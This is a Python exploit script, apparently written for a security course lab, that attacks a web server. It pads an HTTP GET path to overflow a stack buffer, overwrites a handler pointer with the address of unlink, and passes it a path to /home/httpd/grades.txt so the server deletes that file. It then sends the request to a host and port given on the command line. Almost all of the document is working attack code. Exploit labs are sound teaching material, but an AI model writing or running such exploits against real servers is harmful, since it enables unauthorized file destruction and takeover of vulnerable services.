#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct

def build_exploit(shellcode):
  
  # exploit stack overflow at http.c:282
  stack_buffer = 0xbfffd9fc
  root_len = 15
  buf_len = 1024
  reqpath = "/" + "A" * (buf_len - root_len - 1)     # 1 for the "/"

  unlink_addr = 0x40102450
  handler = unlink_addr
  reqpath += struct.pack("<I", handler)
  reqpath += "A" * 16
  arg1_string_addr = stack_buffer + root_len + len(reqpath) + 4
  fd = arg1_string_addr
  reqpath += struct.pack("<I", fd)
  arg1_string = "/home/httpd/grades.txt"
  reqpath += arg1_string

  req =   "GET " + reqpath + " HTTP/1.0\r\n" + \
	    "\r\n"
  return req


def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
	resp = resp + rbuf
	rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())